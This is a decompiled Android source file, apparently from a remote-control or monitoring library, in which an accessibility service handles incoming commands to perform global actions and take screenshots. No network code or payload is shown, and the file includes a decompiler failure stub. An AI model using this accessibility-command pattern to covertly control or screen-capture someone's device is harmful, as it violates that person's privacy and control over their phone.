package com.hawkshaw.library.features.accessibility;

import Y1.K;
import android.os.Build;
import com.hawkshaw.library.datalayer.models.Command;
import com.hawkshaw.library.logger.Logger;
import i.C0528x;
import java.util.concurrent.Executors;

public final class GlobalActionKt {

    public /* synthetic */ class WhenMappings {
        public static final /* synthetic */ int[] $EnumSwitchMapping$0;

        /* JADX WARNING: Failed to process nested try/catch */
        /* JADX WARNING: Missing exception handler attribute for start block: B:3:0x0010 */
        static {
            /*
                com.hawkshaw.library.datalayer.models.Command$AccessibilityCommandRequest$Type[] r0 = com.hawkshaw.library.datalayer.models.Command.AccessibilityCommandRequest.Type.values()
                int r0 = r0.length
                int[] r0 = new int[r0]
                com.hawkshaw.library.datalayer.models.Command$AccessibilityCommandRequest$Type r1 = com.hawkshaw.library.datalayer.models.Command.AccessibilityCommandRequest.Type.PerformGlobalAction     // Catch:{ NoSuchFieldError -> 0x0010 }
                int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x0010 }
                r2 = 1
                r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x0010 }
            L_0x0010:
                com.hawkshaw.library.datalayer.models.Command$AccessibilityCommandRequest$Type r1 = com.hawkshaw.library.datalayer.models.Command.AccessibilityCommandRequest.Type.TakeScreenshot     // Catch:{ NoSuchFieldError -> 0x0019 }
                int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x0019 }
                r2 = 2
                r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x0019 }
            L_0x0019:
                $EnumSwitchMapping$0 = r0
                return
            */
            throw new UnsupportedOperationException("Method not decompiled: com.hawkshaw.library.features.accessibility.GlobalActionKt.WhenMappings.<clinit>():void");
        }
    }

    public static final void handleCommand(MainAccessibilityService mainAccessibilityService, Command.AccessibilityCommandRequest accessibilityCommandRequest) {
        K.n(mainAccessibilityService, "<this>");
        K.n(accessibilityCommandRequest, "command");
        int i5 = WhenMappings.$EnumSwitchMapping$0[accessibilityCommandRequest.getType().ordinal()];
        if (i5 == 1) {
            performGlobalAction(mainAccessibilityService, accessibilityCommandRequest.getAction());
        } else if (i5 == 2) {
            takeScreenshot(mainAccessibilityService);
        }
    }

    private static final void performGlobalAction(MainAccessibilityService mainAccessibilityService, Command.AccessibilityCommandRequest.GlobalAction globalAction) {
        if (globalAction != null) {
            Logger.d$default(Logger.INSTANCE, MainAccessibilityService.TAG, C0528x.e("PerformGlobalAction: ", globalAction.name(), ", ", mainAccessibilityService.performGlobalAction(globalAction.getValue()) ? "Succeed" : "Failed"), false, 4, (Object) null);
        }
    }

    private static final void takeScreenshot(MainAccessibilityService mainAccessibilityService) {
        if (Build.VERSION.SDK_INT >= 30) {
            mainAccessibilityService.takeScreenshot(0, Executors.newSingleThreadExecutor(), new GlobalActionKt$takeScreenshot$callback$1());
            return;
        }
        Logger.d$default(Logger.INSTANCE, MainAccessibilityService.TAG, "TakeScreenshot: not available", false, 4, (Object) null);
    }
}
